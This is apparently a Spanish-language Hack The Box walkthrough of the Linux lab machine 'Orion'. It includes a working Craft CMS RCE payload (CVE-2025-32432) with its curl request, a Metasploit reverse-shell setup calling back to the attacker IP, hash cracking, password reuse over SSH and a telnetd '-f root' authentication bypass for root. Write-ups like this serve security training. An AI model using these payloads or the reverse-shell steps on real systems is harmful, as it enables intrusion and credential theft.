>  [!info] Información de la máquina **Plataforma:** Hack The Box **Máquina:** Orion **OS:** Linux **Dificultad:** Easy **IP objetivo:** `10.129.244.146` **Dominio:** `orion.htb` **IP atacante:** `10.10.14.204`




# How many open TCP ports are listening on Orion?

```bash 
sudo nmap -p- -sCV -T4 10.129.244.146 -oN scanOrion

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://orion.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## What is the version of CraftCMS running on the target?

```bash 
└─$ └─$ ffuf -u http://orion.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -ic 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://orion.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 167ms]
.git/HEAD               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 168ms]
.htpasswd               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 168ms]
.htaccess               [Status: 403, Size: 162, Words: 4, Lines: 8, Duration: 169ms]
                        [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 1315ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 310ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 175ms]
index.html              [Status: 200, Size: 9689, Words: 2708, Lines: 183, Duration: 203ms]
index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 695ms]
index.php               [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 933ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 467ms]

```

![Versión de Craft CMS](../Images/Pasted%20image%2020261001175832.png)

# Which user is running CraftCMS?
Craft CMS se ejecuta como **`www-data`**, como confirma la salida de `phpinfo()` más abajo. La versión **5.6.16** es vulnerable a **CVE-2025-32432**, una RCE **no autenticada** en el endpoint `assets/generate-transform`. Para comprobarlo, primero extraigo el `csrfTokenValue`.

```bash 
curl -s -c cookies.txt http://orion.htb/admin/login -o login.html
```

Ver el token completo: 
```bash 
grep -o '"csrfTokenValue":"[^"]*"' login.html
```

Crear `payload.json` 
```bash
cat > payload.json << 'EOF'
{
  "assetId": 11,
  "handle": {
    "width": 123,
    "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
EOF
```

Correr el payload con curl 
```bash
curl -s -b cookies.txt \
  -H "X-CSRF-Token: TU_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "http://orion.htb/index.php?p=actions/assets/generate-transform" \
  -d @payload.json -o output.html
```

Internamente, Craft usa el framework **Yii**, que tiene una característica (normalmente útil) llamada **configuración de objetos**: le puedes pasar un array/JSON con una clave especial `"class"` y Yii lo interpreta como "instancia esta clase con esta configuración".

Esto es genial si tú controlas qué se puede instanciar... pero aquí el desarrollador dejó que **datos que vienen del usuario (nosotros)** lleguen hasta ese sistema de creación de objetos. Eso es la vulnerabilidad real: **inyección de configuración de objetos**, parecida en espíritu a una deserialización insegura.
Con esto confirma que logramos hacer que el servidor ejecute código que nosotros elegimos, antes de pasar a algo más peligroso (una reverse shell).

```bash
grep "\$_SERVER\['USER'\]" output.html

<tr><td class="e">$_SERVER['USER']</td><td class="v">www-data</td></tr>

```

## Which file contains the password for the MySQL database?

CraftCMS (como muchas apps modernas basadas en Yii/Composer) sigue la convención de **variables de entorno** para guardar configuración sensible — credenciales de base de datos, claves de seguridad, etc. — separada del código fuente. Esto es buena práctica en teoría (evita hardcodear secretos en el código), pero si el archivo `.env` queda expuesto o accesible por un atacante con RCE, el efecto es el mismo: credenciales en texto plano.

La respuesta es el archivo `.env` de la aplicación. La salida de `phpinfo()` guardada en `output.html` muestra las variables de entorno de la base de datos:

```
CRAFT_DB_DRIVER: mysql
CRAFT_DB_SERVER: 127.0.0.1
CRAFT_DB_PORT: 3306
CRAFT_DB_DATABASE: orion
CRAFT_DB_USER: root
CRAFT_DB_PASSWORD: SuperSecureCraft123Pass!
```

```bash
msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > show options 

Module options (exploit/linux/http/craftcms_preauth_rce_cve_2025_32432):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   ASSET_ID  225              yes       Existing asset ID
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...].
                                         Supported proxies: http, sapni, socks4, socks5, socks5h
   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/usin
                                        g-metasploit/basics/using-metasploit.html
   RPORT     80               yes       The target port (TCP)
   SSL       false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.18     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set RHOSTS orion.htb
RHOSTS => orion.htb
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set LHOST 10.10.14.204
LHOST => 10.10.14.204
msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set payload php/unix/cmd/reverse_bash
payload => php/unix/cmd/reverse_bash

```

y en otra terminal ponemos a escuchar un listener en netcat en mi caso en el puerto `4444`:
```bash 
┌──(kali㉿kali)-[~/Desktop/HTB/Orion]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.204] from (UNKNOWN) [10.129.244.146] 58262

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

Adaptamos la shell: 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Acceso a la base de datos](../Images/Pasted%20image%2020261001185058.png)

```bash 
MariaDB [orion]> select username, email, password from users;
select username, email, password from users;
+----------+----------------+--------------------------------------------------------------+
| username | email          | password                                                     |
+----------+----------------+--------------------------------------------------------------+
| admin    | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
+----------+----------------+--------------------------------------------------------------+
1 row in set (0.000 sec)

```

este es el hash bcrypt de `admin`, lo guardamos en un archivo y lo usamos en hashcat.  
```bash 
   hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
   
   darkangel
```

## Submit the flag located in the Adam user's home directory.

Ahora que tenemos la contraseña `darkangel`, el siguiente paso es **probar si Adam la reutilizó para otros servicios** — específicamente SSH, que vimos abierto desde el escaneo inicial de Nmap.
![Acceso como Adam](../Images/Pasted%20image%2020261001185826.png)

## Which service, unrelated to CraftCMS, is open only locally on Orion?
El servicio es **Telnet**, escuchando solo en `127.0.0.1:23`.

```ssh 
adam@orion:~$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:23            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```

## What is the version of the service found?
La versión instalada que reporta el cliente Telnet es **GNU inetutils 2.7**, correspondiente al `telnetd` vulnerable.
```ssh
adam@orion:~$ telnet --version
telnet (GNU inetutils) 2.7
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by many authors.

```

## Root Flag 
Esta versión específica (GNU inetutils telnetd 2.7) es la que contiene la vulnerabilidad **CVE-2026-24061** — un bypass de autenticación bastante simple y directo: el demonio `telnetd` permite pasar la variable de entorno `USER` con un valor malicioso (`-f root`) que, al ser procesada por el programa `login(1)` internamente, se interpreta como un **flag** en lugar de como un simple nombre de usuario.

El flag `-f` en `login` significa _"fast login" / "skip password authentication"_ — se usa normalmente para que un proceso ya autenticado (como el propio `telnetd`, que confía en quien se conecta desde dentro de la red local) no tenga que volver a pedir contraseña. El problema es que `telnetd` no sanitiza ese valor antes de pasarlo, así que podemos controlar nosotros qué usuario "ya autenticado" decimos ser — en este caso, `root`.

![Acceso root mediante Telnet](../Images/Pasted%20image%2020261001190323.png)